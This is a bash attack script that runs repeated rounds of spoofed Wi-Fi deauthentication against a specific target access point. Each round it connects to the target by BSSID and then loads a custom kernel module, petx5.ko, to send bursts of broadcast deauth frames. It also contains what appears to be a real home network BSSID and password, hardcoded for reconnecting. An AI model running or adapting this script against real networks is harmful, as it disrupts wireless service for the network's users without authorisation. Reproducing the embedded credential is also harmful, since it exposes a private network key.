#!/bin/bash
# deauth_pe_v5.sh - Reliable multi-round deauth (fixed dmesg detection)
#
# Usage: sudo bash /tmp/deauth_pe_v5.sh [rounds] [burst]

ROUNDS=${1:-10}
BURST=${2:-3}
HOME_BSSID="8C:DE:F9:B3:9E:20"
HOME_PSK="9006609b29404a"

echo "[*] Spoofed deauth attack - $ROUNDS rounds, $BURST burst/round"

cd /tmp

# Build petx5 if needed
if [ ! -f petx5.ko ] || [ petx5.S -nt petx5.ko ]; then
    echo "[*] Building petx5.ko..."
    as -o petx5.o petx5.S && ld -r -o petx5.ko petx5.o || { echo "BUILD FAIL"; exit 1; }
fi

# Save baseline dmesg line count
BASELINE=$(dmesg | wc -l)

DEAUTH_COUNT=0
SUCCESS_ROUNDS=0

for round in $(seq 1 $ROUNDS); do
    echo -n "[Round $round/$ROUNDS] "

    # Disconnect
    nmcli device disconnect wlan0 2>/dev/null
    sleep 0.3

    # Save a marker - count existing "connected to" lines for target
    CONN_BEFORE=$(dmesg | grep -c "connected to 04:67:61:d6:dc:9[23]")

    # Connect to target AP by BSSID
    nmcli device wifi connect "04:67:61:D6:DC:92" password "dummypassword12345678" ifname wlan0 2>/dev/null &
    PID=$!

    # Poll: wait for a NEW "connected to" line
    OK=0
    for i in $(seq 1 60); do
        CONN_NOW=$(dmesg | grep -c "connected to 04:67:61:d6:dc:9[23]")
        if [ "$CONN_NOW" -gt "$CONN_BEFORE" ]; then
            OK=1
            break
        fi
        sleep 0.05
    done

    if [ $OK -eq 0 ]; then
        echo "FAIL (no connect)"
        kill $PID 2>/dev/null; wait $PID 2>/dev/null
        nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
        sleep 2
        continue
    fi

    SUCCESS_ROUNDS=$((SUCCESS_ROUNDS + 1))

    # Send burst of spoofed deauths
    SENT=0
    for b in $(seq 1 $BURST); do
        rmmod kfind 2>/dev/null
        sleep 0.05
        insmod /tmp/petx5.ko 2>/dev/null
        if [ $? -eq 0 ]; then
            DEAUTH_COUNT=$((DEAUTH_COUNT + 1))
            SENT=$((SENT + 1))
            rmmod kfind 2>/dev/null
            sleep 0.1
        else
            break
        fi
    done
    echo "OK ($SENT deauths, total=$DEAUTH_COUNT)"

    # Kill nmcli background process
    kill $PID 2>/dev/null; wait $PID 2>/dev/null

    # Cleanup auto-created NM profiles
    for prof in $(nmcli -t -f NAME connection show | grep -v "9899" | grep -v "lo" | grep -v "waydroid" | grep -v "bridge"); do
        nmcli connection delete "$prof" 2>/dev/null
    done

    # Reconnect home
    nmcli device wifi connect "$HOME_BSSID" password "$HOME_PSK" ifname wlan0 2>/dev/null
    sleep 1.5
done

echo ""
echo "[*] === RESULTS ==="
echo "[*] $DEAUTH_COUNT spoofed deauths in $SUCCESS_ROUNDS/$ROUNDS rounds"
echo "[*] Deauth log:"
dmesg | grep "Deauth TX.*ff:ff:ff" | tail -30
echo "[*] Done."
